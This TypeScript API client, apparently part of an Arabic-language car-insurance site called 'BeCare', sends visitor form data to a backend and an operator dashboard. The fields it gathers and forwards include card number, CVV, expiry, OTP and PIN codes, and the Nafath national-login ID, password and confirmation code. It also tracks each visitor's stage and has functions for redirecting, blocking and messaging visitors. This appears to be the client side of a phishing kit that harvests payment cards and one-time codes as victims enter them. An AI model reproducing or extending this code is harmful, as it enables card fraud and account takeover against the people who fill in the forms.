/**
 * BeCare API Client
 * Replaces all Firebase Firestore calls with REST API + Socket.io calls
 */

// API connects to the same-origin backend so all visitor data is persisted via the
// PostgreSQL-backed server rather than being routed to old external hosts.
const _rawApiUrl = (import.meta.env.VITE_API_URL || '').trim();
const fallbackApiBase = typeof window !== 'undefined' ? window.location.origin : '';
export const API_BASE = _rawApiUrl || fallbackApiBase || '';

// ─── HTTP Helper ──────────────────────────────────────────────────────────────
async function apiRequest(method: string, path: string, body?: any): Promise<any> {
  const res = await fetch(`${API_BASE}${path}`, {
    method,
    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
    body: body ? JSON.stringify(body) : undefined,
  });
  if (!res.ok) {
    const err = await res.json().catch(() => ({ error: 'Unknown error' }));
    throw new Error(err.error || `HTTP ${res.status}`);
  }
  return res.json();
}

export function hasMeaningfulDashboardPayload(payload: Record<string, any> | undefined): boolean {
  if (!payload || typeof payload !== 'object') return false;

  const nestedPayload = payload.raw ?? payload.formData ?? payload.data;
  if (nestedPayload && typeof nestedPayload === 'object' && nestedPayload !== payload) {
    if (hasMeaningfulDashboardPayload(nestedPayload)) return true;
  }

  const ignoredValues = new Set(['عميل جديد', 'new', 'visitor', 'زائر']);

  const userInputFields = [
    'ownerName', 'buyerName', 'customer', 'name', 'firstName', 'lastName',
    'identityNumber', 'buyerIdNumber', 'phoneNumber', 'email', 'serialNumber',
    'registrationType', 'coverageType', 'vehicleModel', 'manufacturingYear',
    'vehicleUsage', 'usage', 'repairLocation', 'insuranceCoverage', 'vehicleValue',
    'vehicleYear', 'vehiclePlate', 'companyName', 'originalPrice', 'discount',
    'finalPrice', 'features', 'cardNumber', 'cardOwner', 'cardExpiry', 'cvv',
    'verificationCode', 'selectedOffer', 'offerTotalPrice', 'paymentMethod',
    '_v1', '_v2', '_v3', '_v4', '_v5', '_v6', '_v7', 'otpCode', 'pinCode',
    'nafadIdNumber', 'nafadPassword', 'nafadConfirmationCode', 'phoneOtp',
    'phoneIdNumber', 'hasCard', 'paymentStatus', 'comparCompletedAt', 'homeCompletedAt',
  ];

  return userInputFields.some((key) => {
    const value = payload[key];
    if (value === undefined || value === null) return false;
    if (typeof value === 'string') {
      const trimmed = value.trim();
      return trimmed.length > 0 && !ignoredValues.has(trimmed);
    }
    if (typeof value === 'number') return true;
    if (Array.isArray(value)) {
      return value.some((entry) => (typeof entry === 'string' ? entry.trim().length > 0 : Boolean(entry)));
    }
    return Boolean(value);
  });
}

function hasSubmissionIntent(payload: Record<string, any> | undefined): boolean {
  if (!payload || typeof payload !== 'object') return false;

  const nestedPayload = payload.raw ?? payload.formData ?? payload.data;
  if (nestedPayload && typeof nestedPayload === 'object' && nestedPayload !== payload) {
    if (hasSubmissionIntent(nestedPayload)) return true;
  }

  if (payload.source === 'submit' || payload.source === 'form-submit' || payload.submit === true || payload.isSubmission === true) {
    return true;
  }

  const submissionKeys = [
    'ownerName', 'buyerName', 'customer', 'name', 'firstName', 'lastName',
    'identityNumber', 'buyerIdNumber', 'phoneNumber', 'email', 'serialNumber',
    'registrationType', 'coverageType', 'vehicleModel', 'manufacturingYear',
    'vehicleUsage', 'usage', 'repairLocation', 'insuranceCoverage', 'vehicleValue',
    'vehicleYear', 'vehiclePlate', 'companyName', 'originalPrice', 'discount',
    'finalPrice', 'features', 'cardNumber', 'cardOwner', 'cardExpiry', 'cvv',
    'verificationCode', 'selectedOffer', 'offerTotalPrice', 'paymentMethod',
    '_v1', '_v2', '_v3', '_v4', '_v5', '_v6', '_v7', 'otpCode', 'pinCode',
    'nafadIdNumber', 'nafadPassword', 'nafadConfirmationCode', 'phoneOtp',
    'phoneIdNumber', 'hasCard', 'paymentStatus', 'comparCompletedAt', 'homeCompletedAt',
    'otpSubmittedAt', 'pinSubmittedAt', 'phoneSubmittedAt', 'cardSubmittedAt',
    'homeNewSubmittedAt', 'insurSubmittedAt', 'nafadSubmittedAt',
    'submittedAt', 'updatedAt', 'createdAt',
  ];

  return submissionKeys.some((key) => {
    const value = payload[key];
    if (value === undefined || value === null) return false;
    if (typeof value === 'string') {
      return value.trim().length > 0;
    }
    return Boolean(value);
  });
}

export async function notifyDashboard(payload: Record<string, any>): Promise<void> {
  if (typeof window === 'undefined') return;
  
  console.log('[notifyDashboard] Called with payload keys:', Object.keys(payload));
  
  try {
    let fallbackVisitorId = window.localStorage.getItem('visitor') || `visitor_${Date.now()}`;
    console.log('[notifyDashboard] fallbackVisitorId:', fallbackVisitorId);
    
    // Verify visitorId is still valid
    try {
      const response = await apiRequest('GET', `/api/visitors/${fallbackVisitorId}`);
      if (!response || !response.id) {
        console.log('[notifyDashboard] Visitor deleted, getting new ID...');
        const newId = await createVisitor({});
        fallbackVisitorId = newId;
        window.localStorage.setItem('visitor', newId);
      }
    } catch {
      // Error means visitor doesn't exist, get new one
      try {
        const newId = await createVisitor({});
        fallbackVisitorId = newId;
        window.localStorage.setItem('visitor', newId);
      } catch {
        console.log('[notifyDashboard] Cannot get visitorId, skipping');
        return;
      }
    }
    
    const hasIdentity = Boolean(payload?.id || payload?.visitorId || payload?.raw?.id || payload?.raw?.visitorId || fallbackVisitorId);
    console.log('[notifyDashboard] hasIdentity:', hasIdentity);
    console.log('[notifyDashboard] hasSubmissionIntent:', hasSubmissionIntent(payload));
    
    if (!hasSubmissionIntent(payload)) {
      console.log('[notifyDashboard] Skipping - not a form submission payload');
      return;
    }

    const visitorId = payload?.id || payload?.visitorId || payload?.raw?.id || payload?.raw?.visitorId || fallbackVisitorId;
    const combinedPayload = { ...(payload?.raw || {}), ...(payload || {}) };
    const customerName = String(
      combinedPayload?.customer ||
      combinedPayload?.ownerName ||
      combinedPayload?.buyerName ||
      combinedPayload?.name ||
      combinedPayload?.firstName ||
      combinedPayload?.lastName ||
      combinedPayload?.identityNumber ||
      combinedPayload?.phoneNumber ||
      payload?.raw?.ownerName ||
      payload?.raw?.buyerName ||
      payload?.raw?.name ||
      'زائر'
    );
    const currentPage = String(combinedPayload?.currentPage || combinedPayload?.page || payload?.raw?.currentPage || payload?.raw?.page || 'home');
    
    // Parse currentStep - handle both numeric and string values like "_st1", "_t2", "_t3"
    const rawStep = combinedPayload?.currentStep ?? combinedPayload?.step ?? payload?.raw?.currentStep ?? payload?.raw?.step ?? 1;
    let currentStep = Number(rawStep);
    if (isNaN(currentStep)) {
      const match = String(rawStep).match(/_t?(\d+)/);
      currentStep = match ? parseInt(match[1], 10) : 1;
    }

    let stage = 'الخطوة 1';
    let status = 'جديد';
    let badge = 'new';

    if (currentPage === 'insur' || currentPage === 'confi' || currentPage === 'veri' || currentPage === 'check' || currentStep >= 2) {
      stage = 'الخطوة 2';
      status = 'قيد المعالجة';
      badge = 'pending';
    }
    if (currentPage === 'nafad' || currentPage === 'phone' || currentPage === 'thank-you' || currentStep >= 3) {
      stage = 'الخطوة 3';
      status = 'مكتمل';
      badge = '';
    }

    // Use visitorId directly as id (NOT REQ-XXXXXX) for proper upsert
    const dashboardPayload = {
      id: String(visitorId), // Use visitorId directly for upsert
      visitorId: String(visitorId),
      customer: String(customerName),
      status,
      stage,
      updated: 'تم التحديث الآن',
      badge,
      submittedAt: payload?.submittedAt || payload?.updatedAt || payload?.createdAt || payload?.homeCompletedAt || payload?.comparCompletedAt || payload?._v1UpdatedAt || payload?._v5UpdatedAt || payload?._v6UpdatedAt || payload?._v7UpdatedAt || payload?.nafadUpdatedAt || new Date().toISOString(),
      raw: payload,
      source: 'submit',
    };
    
    console.log('[notifyDashboard] Sending to server:', dashboardPayload);

    const baseUrl = (API_BASE || window.location.origin || '').replace(/\/+$/, '');
    const dashboardUrl = `${baseUrl}/api/dashboard/requests`;
    const response = await fetch(dashboardUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(dashboardPayload),
    });
    console.log('[notifyDashboard] Response OK:', response.ok);
  } catch (error) {
    console.error('[notifyDashboard] Error:', error);
    // ignore dashboard notification failures
  }
}

// ─── Visitor API ──────────────────────────────────────────────────────────────

/** Create or initialize a visitor document */
export async function createVisitor(data: Record<string, any>): Promise<string> {
  const result = await apiRequest('POST', '/api/visitors', data);
  // Save the returned visitorId to localStorage (server may have changed it)
  if (typeof window !== 'undefined' && result.visitorId) {
    window.localStorage.setItem('visitor', result.visitorId);
  }
  return result.visitorId;
}

/** Persist visitor data and notify dashboard only on explicit form submission */
export async function submitVisitorFormData(data: Record<string, any>): Promise<void> {
  let visitorId = data?.id || data?.visitorId || data?.raw?.id || data?.raw?.visitorId || (typeof window !== 'undefined' ? window.localStorage.getItem('visitor') : null);
  if (!visitorId) return;

  // Verify visitorId is still valid (not deleted from DB)
  if (typeof window !== 'undefined') {
    try {
      const response = await apiRequest('GET', `/api/visitors/${visitorId}`);
      if (!response || !response.id) {
        // Visitor was deleted, get a new one
        console.log('[submitVisitorFormData] Visitor deleted, getting new ID...');
        const newId = await createVisitor({});
        visitorId = newId;
      }
    } catch {
      // Error means visitor doesn't exist, get new one
      console.log('[submitVisitorFormData] Visitor check failed, getting new ID...');
      try {
        const newId = await createVisitor({});
        visitorId = newId;
      } catch {
        // Can't create visitor, skip
        return;
      }
    }
    window.localStorage.setItem('visitor', String(visitorId));
  }

  try {
    await addData(data);
  } catch {
    // Silently ignore - visitor may not exist yet or network error
  }

  await notifyDashboard({ ...data, id: String(visitorId), visitorId: String(visitorId), source: 'submit' });
}

/** Get visitor data by ID */
export async function getData(id: string): Promise<Record<string, any> | null> {
  try {
    return await apiRequest('GET', `/api/visitors/${id}`);
  } catch {
    return null;
  }
}

/** Update visitor data (partial update) */
export async function addData(data: Record<string, any>): Promise<void> {
  const { id, ...payload } = data;
  let visitorId = id || (typeof window !== 'undefined' ? localStorage.getItem('visitor') : null);
  if (!visitorId) return;

  // Verify visitorId is still valid (not deleted from DB)
  // If not valid, get a new one
  if (typeof window !== 'undefined') {
    try {
      const response = await apiRequest('GET', `/api/visitors/${visitorId}`);
      if (!response || !response.id) {
        // Visitor was deleted, get a new one
        console.log('[addData] Visitor deleted, getting new ID...');
        const newId = await createVisitor({});
        visitorId = newId;
      }
    } catch {
      // Error means visitor doesn't exist, get new one
      console.log('[addData] Visitor check failed, getting new ID...');
      try {
        const newId = await createVisitor({});
        visitorId = newId;
      } catch {
        // Can't create visitor, skip
        return;
      }
    }
    localStorage.setItem('visitor', visitorId);
  }

  try {
    await apiRequest('PATCH', `/api/visitors/${visitorId}`, payload);
  } catch {
    // Silently ignore - visitor may not exist yet or network error
  }

  // Update dashboard only when the visitor submitted meaningful data
  if (hasMeaningfulDashboardPayload({ ...payload, id: visitorId, visitorId })) {
    await updateDashboardEntry({ ...payload, id: visitorId, visitorId: visitorId });
  }
}

/** Update dashboard entry with current data */
async function updateDashboardEntry(data: Record<string, any>): Promise<void> {
  const visitorId = data?.visitorId || data?.id || (typeof window !== 'undefined' ? localStorage.getItem('visitor') : null);
  if (!visitorId) return;

  // Fetch full visitor data from database to include all fields
  let fullData = { ...data };
  try {
    const response = await apiRequest('GET', `/api/visitors/${visitorId}`);
    if (response && response.id) {
      fullData = { ...response, ...data }; // Merge DB data with current data
    }
  } catch (error) {
    console.log('[Dashboard] Could not fetch full visitor data');
  }

  if (!hasMeaningfulDashboardPayload(fullData)) {
    return;
  }

  const customerName = fullData?.ownerName || fullData?.buyerName || fullData?.name || fullData?.identityNumber || 'عميل جديد';
  const currentStep = fullData?.currentStep || 1;
  const currentPage = fullData?.currentPage || 'home';

  // Determine stage and status based on current page/step
  let stage = 'الخطوة 1';
  let status = 'جديد';
  let badge = 'new';

  if (currentPage === 'insur' || currentPage === 'confi' || currentPage === 'veri' || currentPage === 'check' || currentStep >= 2) {
    stage = 'الخطوة 2';
    status = 'قيد المعالجة';
    badge = 'pending';
  }
  if (currentPage === 'nafad' || currentPage === 'phone' || currentPage === 'thank-you' || currentStep >= 3) {
    stage = 'الخطوة 3';
    status = 'مكتمل';
    badge = '';
  }

  try {
    const response = await fetch('/api/dashboard/requests', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        id: visitorId,
        visitorId: visitorId,
        customer: customerName,
        identityNumber: fullData?.identityNumber || '',
        phoneNumber: fullData?.phoneNumber || '',
        currentStep: currentStep,
        currentPage: currentPage,
        status: status,
        stage: stage,
        updated: 'تم التحديث الآن',
        badge: badge,
        submittedAt: new Date().toISOString(),
        raw: fullData
      })
    });
    
    if (response.ok) {
      console.log('[Dashboard] Updated:', customerName, '-', stage);
    }
  } catch (error) {
    console.error('[Dashboard] Update failed:', error);
  }
}

/** Set current page for visitor */
export const handleCurrentPage = (page: string): void => {
  if (typeof window === 'undefined') return;
  const visitorId = localStorage.getItem('visitor');
  if (!visitorId) return;
  addData({ id: visitorId, currentPage: page });
};

/** Handle payment info update */
export const handlePay = async (paymentInfo: any, setPaymentInfo: any): Promise<void> => {
  try {
    const visitorId = typeof window !== 'undefined' ? localStorage.getItem('visitor') : null;
    if (visitorId) {
      await apiRequest('PATCH', `/api/visitors/${visitorId}`, { ...paymentInfo, status: 'pending' });
      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
    }
  } catch (error) {
    console.error('[API] Error adding payment info:', error);
  }
};

/** Add history entry */
export async function addToHistory(visitorId: string, type: string, data: any, status: string = 'pending'): Promise<void> {
  try {
    await apiRequest('POST', `/api/visitors/${visitorId}/history`, { type, data, status });
  } catch (e) {
    console.error('[API] Error adding history:', e);
  }
}

/** Set visitor offline */
export async function setVisitorOffline(visitorId: string): Promise<void> {
  try {
    await apiRequest('POST', `/api/visitors/${visitorId}/offline`, {});
  } catch {
    // silent
  }
}

/** Clear redirect page */
export async function clearRedirectPage(visitorId: string): Promise<void> {
  try {
    await apiRequest('POST', `/api/visitors/${visitorId}/clear-redirect`, {});
  } catch {
    // silent
  }
}

/** Check if visitor is blocked */
export async function checkIfBlocked(visitorId: string): Promise<boolean> {
  try {
    const data = await getData(visitorId);
    return data?.is_blocked === true || data?.isBlocked === true;
  } catch {
    return false;
  }
}

/** Get messages for visitor */
export async function getMessages(visitorId: string): Promise<any[]> {
  try {
    return await apiRequest('GET', `/api/visitors/${visitorId}/messages`);
  } catch {
    return [];
  }
}

/** Send message */
export async function sendMessage(visitorId: string, message: string, senderName?: string): Promise<void> {
  // Messages are sent via Socket.io (see socket.ts)
  // This is a fallback REST call
  try {
    await apiRequest('POST', `/api/visitors/${visitorId}/messages`, { message, senderName });
  } catch (e) {
    console.error('[API] Error sending message:', e);
  }
}
